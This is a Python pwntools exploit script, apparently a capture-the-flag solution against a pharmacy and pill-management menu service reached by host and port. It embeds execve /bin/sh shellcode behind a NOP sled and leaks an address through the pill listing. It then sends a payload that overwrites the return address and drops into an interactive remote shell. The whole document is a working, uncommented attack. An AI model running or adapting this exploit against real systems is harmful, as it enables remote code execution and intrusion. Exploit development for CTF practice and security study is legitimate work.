from pwn import *
import sys

s = remote(sys.argv[1],int(sys.argv[2]))

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27byte
shellpill = "\x90"*229 + shellcode
Apill = "A"*100

# pill menu
s.recvuntil("-> ")
s.send("2\n")

# add pill(shellpill) to put shellcode and to leak
s.recvuntil("-> ")
s.send("1\n")
s.recvuntil("Pill Name: ") 
s.send(shellpill+"\n")
s.recvuntil("Dosage: ")
s.send("1\n")
s.recvuntil("Schedule: ")
s.send("1\n")
s.recvuntil(": ")
s.send("symptom\n\n")
s.recvuntil(": ")
s.send("\n\n")
s.recvuntil(": ")
s.send("\n\n")

# list pill to leak
s.recvuntil("-> ")
s.send("3\n")
s.recvuntil(shellpill)
leaked = s.recvuntil("\n")[:-1] # leak
leaked_addr = u64(leaked+"\x00\x00")
shell_addr = p64(leaked_addr+0x48)
log.info("leaked shell addr is : "+hex(u64(shell_addr)))
payload = "B"*24 + shell_addr

# add pill(payload) to change rip
s.recvuntil("-> ")
s.send("1\n") # add pill
s.recvuntil("Pill Name: ")
s.send(payload+"\n")
s.recvuntil("Dosage: ")
s.send("2\n")
s.recvuntil("Schedule: ")
s.send("2\n")
s.recvuntil(": ")
s.send("symptom\n\n")
s.recvuntil(": ")
s.send("\n\n")
s.recvuntil(": ")
s.send("\n\n")

# add pill(Apill) to fill stack
s.recvuntil("-> ")
s.send("1\n")
s.recvuntil("Pill Name: ")
s.send(Apill+"\n")
s.recvuntil("Dosage: ")
s.send("2\n")
s.recvuntil("Schedule: ")
s.send("2\n")
s.recvuntil(": ")
s.send("symptom\n\n")
s.recvuntil(": ")
s.send("\n\n")
s.recvuntil(": ")
s.send("\n\n")

s.recvuntil("-> ")
s.send("6\n")

# pharmacist menu
s.recvuntil("-> ")
s.send("3\n")
s.recvuntil("-> ")
s.send("1\n")
s.recvuntil(": ")
s.send("conchi\n")
s.recvuntil(": ")
s.send("3\n")

s.recvuntil("-> ")
s.send("5\n")

# patient menu
s.recvuntil("-> ")
s.send("4\n")
s.recvuntil("-> ")
s.send("1\n")
s.recvuntil(": ")
s.send("pati\n")
s.recvuntil(": ")
s.send("Y\n")
s.recvuntil(": ")
s.send("symptom\n\n")

s.recvuntil("-> ")
s.send("5\n")

# pharmacy menu
s.recvuntil("-> ")
s.send("1\n")
s.recvuntil("-> ")
s.send("1\n")
s.recvuntil("? ")
s.send("phar\n")
s.recvuntil(": ")
s.send(Apill+"\n")
s.send(payload+"\n\n")
s.recvuntil(": ")
s.send("conchi\n\n")

s.recvuntil("-> ")
s.send("5\n")

# scrip menu
s.recvuntil("-> ")
s.send("5\n")

s.recvuntil("-> ")
s.send("1\n") # select phar
s.recvuntil(": ")
s.send("phar\n")
s.recvuntil("-> ")
s.send("2\n") # select pharmacist
s.recvuntil(": ")
s.send("1\n")
s.recvuntil("-> ")
s.send("3\n") # select patient
s.recvuntil(": ")
s.send("pati\n")

# add scrip
s.recvuntil("-> ")
s.send("4\n")
s.recvuntil(": ")
s.send("-1\n")
s.recvuntil(": ")
s.send(Apill+"\n")
s.recvuntil(": ")
s.send(Apill+"\n")
s.recvuntil(": ")
s.send(Apill+"\n")
s.recvuntil(": ")
s.send(Apill+"\n")
s.recvuntil(": ")
s.send(Apill+"\n")
s.recvuntil(": ")
s.send(payload+"\n")
s.recvuntil(": ")
s.send("\n")

s.interactive()